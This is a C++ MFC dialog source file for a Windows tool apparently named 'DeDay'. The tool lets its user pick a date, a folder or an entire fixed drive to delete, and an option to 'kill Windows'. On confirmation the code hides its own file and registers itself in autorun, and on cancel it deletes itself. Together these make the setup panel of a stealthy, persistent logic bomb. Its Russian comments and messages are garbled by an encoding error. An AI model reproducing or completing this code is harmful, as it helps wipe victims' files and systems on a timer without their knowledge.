// DeDayDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DeDay.h"
#include "DeDayDlg.h"
#include "DeleteDay.h"

#include <string>
using namespace std;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CDeDayDlg dialog

CDeDayDlg::CDeDayDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDeDayDlg::IDD, pParent)
	, m_csPath(_T(""))
	, m_bDeleteOnDrive(FALSE)
	, m_bKillWindows(FALSE)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CDeDayDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_PATH, m_csPath);
	DDX_Control(pDX, IDC_MONTHCALENDAR1, m_MonthCalCtrl);
	DDX_Check(pDX, IDC_DELETE_ON_DRIVE, m_bDeleteOnDrive);
	DDX_Check(pDX, IDC_KILLWINDOWS, m_bKillWindows);
}

BEGIN_MESSAGE_MAP(CDeDayDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CDeDayDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BTN_BROWS, &CDeDayDlg::OnBnClickedBtnBrows)
	ON_EN_CHANGE(IDC_PATH, &CDeDayDlg::OnEnChangePath)
	ON_BN_CLICKED(IDC_DELETE_ON_DRIVE, &CDeDayDlg::OnBnClickedDeleteAllOnDrive)
	ON_BN_CLICKED(IDC_KILLWINDOWS, &CDeDayDlg::OnBnClickedKillwindows)
	ON_BN_CLICKED(IDCANCEL, &CDeDayDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CDeDayDlg message handlers

BOOL CDeDayDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//���� � �������� ������ �� ������� ��������� ������ "OK"
	GetDlgItem(IDOK)->EnableWindow(FALSE);
	//��������� ���������
	InitDriveLetterComboBox();

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CDeDayDlg::InitDriveLetterComboBox() {
	CComboBox* driveLetter = (CComboBox*)GetDlgItem(IDC_DRIVE_LETTER);
	
	//CString listOfDrives = getListOfLogicalDrives();

	wchar_t buf[26];
	//�������� ������ ���������� ������ � ������� ���� c://, d://
	int  lengthInCharacters = GetLogicalDriveStrings(sizeof(buf), buf);
	
	//����� �� ������ ������ ������ ��� ����� ���� ������.
	wchar_t letterArray[2] = {'\0'};
	
	for (wchar_t *s = buf; *s; s += wcslen(s) + 1) {
		letterArray[0] = *s;

		if (GetDriveType(s) == DRIVE_FIXED) {
			driveLetter->AddString(letterArray);
		}		
	}

	//��-�� �����, �� ��� ����������.
	/*for (int c = 0; c < lengthInCharacters; c += 4) {
		letterArray[0] = buf[c];		
		driveLetter->AddString(letterArray);
	}	*/
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CDeDayDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CDeDayDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CDeDayDlg::OnBnClickedOk()
{
	CDeleteDay dDay;
	dDay.HideFile(true);	
	//�������� ���� � ������������
	if (!dDay.AddToAutoRun()) {
		MessageBox(L"���-�� ����� �� ���. AddToAutoRun() fail", L"���-�� ����� �� ���", MB_ICONERROR);
	}		
	
	//��������� ���� �������� �����
	SYSTEMTIME SysTime;
	ZeroMemory(&SysTime, 0);
	m_MonthCalCtrl.GetCurSel(&SysTime);
	
	if (!dDay.WriteDateOfPerformance(SysTime)) {
		MessageBox(L"���-�� ����� �� ���. SaveDateOfPerformance() fail", L"���-�� ����� �� ���", MB_ICONERROR);
	}

	//��������� ��� �������
	if (!dDay.WritePathOfFolderToDelete(m_csPath.GetString())) {
		MessageBox(L"���-�� ����� �� ���. SavePathOfFolderToDelete() fail", L"���-�� ����� �� ���", MB_ICONERROR);
	}

	UpdateData(TRUE);

	if ( m_bDeleteOnDrive ){
		//��������� �� ����� ����� ��� �������.
		//�������� ����� ����� �� ���������.
		CString driveLetter;
		GetDlgItemText(IDC_DRIVE_LETTER, driveLetter);
		dDay.WriteOnWhichDiskToRemove(driveLetter);
	}

	if ( m_bKillWindows ){
		dDay.WriteTaskKillWindows();
	}
	
	OnOK();
}

//�������� ����� ��� ��������
void CDeDayDlg::OnBnClickedBtnBrows()
{
	//���� TRUE �� ������ "Open", FALSE - Save As
	//CFileDialog dlgFile(TRUE, NULL, NULL, OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY);
	//dlgFile.DoModal();
	
	wchar_t pszDir[512];

	BROWSEINFO    bi;
	LPITEMIDLIST  pidlBrowse;  // Fill in the BROWSEINFO structure.
	bi.hwndOwner      = NULL;
	bi.pidlRoot       = NULL;
	bi.pszDisplayName = pszDir;
	bi.lpszTitle      = L"Select the  directory";
	bi.ulFlags        = BIF_RETURNONLYFSDIRS;
	bi.lpfn           = NULL;
	bi.lParam         = 0;
	bi.iImage         = 0;  // Browse for a folder and return its PIDL.
	pidlBrowse = SHBrowseForFolder(&bi);  

	if (pidlBrowse == NULL)
	{
		return;  
	}

	if(SHGetPathFromIDList(pidlBrowse, pszDir) != TRUE)
	{	
		CoTaskMemFree(pidlBrowse);
		MessageBox(L"�� ������� �������� ���� � �����.", L"�����");
		return;
	}
	
	CoTaskMemFree(pidlBrowse);

	m_csPath = pszDir;
	UpdateData(FALSE);

	OnEnChangePath();
}

void CDeDayDlg::OnEnChangePath()
{
	UpdateData(TRUE);

	if (m_csPath.Compare(L"") != 0)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedDeleteAllOnDrive()
{
	UpdateData(TRUE);

	if (m_bDeleteOnDrive)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedKillwindows()
{
	UpdateData(TRUE);

	if (m_bKillWindows)
	{
		GetDlgItem(IDOK)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDOK)->EnableWindow(FALSE);
	}
}

void CDeDayDlg::OnBnClickedCancel()
{
	CDeleteDay dDay;
	//������� ���� ����
	TRACE(" >>> ������� ���� ���� <<<\n");
	dDay.SelfDelete();
	
	OnCancel();
}
